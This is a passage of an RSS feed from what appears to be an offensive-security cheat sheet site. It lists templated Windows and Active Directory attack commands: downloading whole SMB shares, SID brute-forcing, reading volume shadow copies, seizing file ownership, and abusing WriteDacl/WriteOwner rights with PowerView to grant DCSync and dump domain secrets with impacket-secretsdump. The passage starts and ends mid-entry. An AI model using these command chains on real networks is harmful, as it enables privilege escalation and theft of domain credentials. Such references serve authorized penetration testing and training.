&amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -r &amp;lt;SHARE&amp;gt; -A &amp;lt;FILE_PATTERN&amp;gt; smbclient smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; # After found an accessible share smbclient \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; smbclient Basic Commands # List all files in a share recurse ON ls # Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * impacket-smbclient (Kerberos) impacket-smbclient &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass SID Brute # Null auth allowed impacket-lookupsid test@&amp;lt;DOMAIN&amp;gt; -no-pass Mount SMB Share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # With creds sudo mount -t cifs -o ro,user=&amp;lt;USER&amp;gt;,password=&amp;lt;PASSWORD&amp;gt; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt Check write permission sudo find .</description>
    </item>
    <item>
      <title>Volume Shadow Copies</title>
      <link>https://tldrbins.github.io/volume_shadow_copies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/volume_shadow_copies/</guid>
      <description> Abuse #1: Recover data from shadow copies 1. Check vssadmin list shadows 2. Create symlink and expose the volume cmd /c mklink /d C:\VSS &amp;lt;SHADOW_COPY_VOLUME_PATH&amp;gt; 3. Access ls C:\VSS\Users </description>
    </item>
    <item>
      <title>Windows ACLs</title>
      <link>https://tldrbins.github.io/windows_acls/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_acls/</guid>
      <description> Window ACLs (Access Control Lists) Check ACLs # Check a file/directory icacls &amp;lt;PATH&amp;gt; # Check all files and directories icacls * /C Grant user full control # cmd cmd.exe /c cacls &amp;lt;FILE&amp;gt; /E /G &amp;lt;USER&amp;gt;:F # powershell icacls &amp;lt;FILE&amp;gt; /grant &amp;lt;USER&amp;gt;:F Change owner (WO) # cmd cmd.exe /c takeown /F &amp;lt;FILE&amp;gt; +---------------------------------------------------+ | F (full access) | | M (modify access) | | RX (read and execute access) | | R (read-only access) | | W (write-only access) | | D (delete) | | RC (read control) | | WDAC (write DAC) | | WO (write owner) | | S (synchronize) | | AS (access system security) | | MA (maximum allowed) | | GR (generic read) | | GW (generic write) | | GE (generic execute) | | GA (generic all) | | RD (read data/list directory) | | WD (write data/add file) | | AD (append data/add subdirectory) | | REA (read extended attributes) | | WEA (write extended attributes) | | X (execute/traverse) | | DC (delete child) | | RA (read attributes) | | WA (write attributes) | | OI (object inherit) | | CI (container inherit) | | IO (inherit only) | | NP (do not propagate inherit) | | I (permission inherited from parent container) | +---------------------------------------------------+ </description>
    </item>
    <item>
      <title>Windows RPC</title>
      <link>https://tldrbins.github.io/windows_rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_rpc/</guid>
      <description> Windows RPC # Show mappings impacket-rpcmap &amp;#39;ncacn_ip_tcp:&amp;lt;TARGET&amp;gt;&amp;#39; IOXIDResolver&#xA;# Get network interface without auth python3 IOXIDResolver.py -t &amp;lt;TARGET&amp;gt; </description>
    </item>
    <item>
      <title>WriteDacl</title>
      <link>https://tldrbins.github.io/writedacl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writedacl/</guid>
      <description> Abuse #1: Add dcsync right to user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
    </item>
    <item>
      <title>WriteOwner/Own</title>
      <link>https://tldrbins.github.io/writeowner/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writeowner/</guid>
      <description>Abuse #1 : Change owner of the group (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;USER&amp;gt; Abuse #2 : Add user to the group (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add user to group Add-DomainObjectAcl -TargetIdentity &amp;lt;TARGET_GROUP&amp;gt; -PrincipalIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -Rights All -DomainController &amp;lt;DC&amp;gt; -Credential $cred Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USER&amp;gt; -Credential $cred Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Domain &amp;lt;DOMAIN&amp;gt; -DomainController &amp;lt;DC&amp;gt; -Credential $cred | fl MemberName # Or net user &amp;lt;USER&amp;gt; # Exit current sessions or re-login whoami /groups Abuse #2 : Add user to the group (From Linux) 0.</description>
    </item>
  </channel>
</rss>
